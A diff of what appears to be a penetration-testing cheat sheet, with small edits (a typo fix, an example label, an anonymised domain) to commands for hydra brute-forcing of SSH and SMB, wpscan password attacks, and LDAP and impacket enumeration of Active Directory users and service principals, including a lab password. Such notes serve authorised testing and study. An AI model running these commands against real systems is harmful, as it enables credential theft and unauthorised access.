@@ -59,7 +59,7 @@ hydra -s 22 -v -t 4 -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh
 
 ## Port 80
 ```
-wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token {toekn-api}
+wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token {token-api}
 ```
 
 ## Port 110
@@ -150,10 +150,10 @@ hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 
 ./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
-./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
+-----> EX: ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
 
 // Verify if a SPN exist
-ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
+ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=domain,dc=com" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
 
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
 -----> EX: ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
